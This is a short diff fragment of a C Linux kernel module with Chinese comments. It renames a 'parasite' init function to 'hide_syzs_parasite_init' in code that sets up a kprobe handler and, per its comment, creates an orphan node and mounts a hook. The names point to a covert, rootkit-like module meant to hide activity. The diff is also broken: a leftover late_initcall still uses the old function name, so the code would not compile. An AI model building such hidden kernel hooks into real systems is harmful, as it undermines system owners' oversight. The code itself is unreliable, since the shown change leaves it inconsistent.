@@ -133,7 +133,7 @@ static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
 }
 
 // 初始化：创建孤儿节点并挂载 Hook
-static int __init parasite_init(void) {
+static int __init hide_syzs_parasite_init(void) {
     struct dentry *dentry;
     struct path path;
 
@@ -151,7 +151,7 @@ static int __init parasite_init(void) {
 
     return 0;
 }
-late_initcall(parasite_init);
+late_initcall(hide_syzs_parasite_init);
 
 // 使用 late_initcall 确保在设备驱动初始化后执行
 late_initcall(parasite_init);
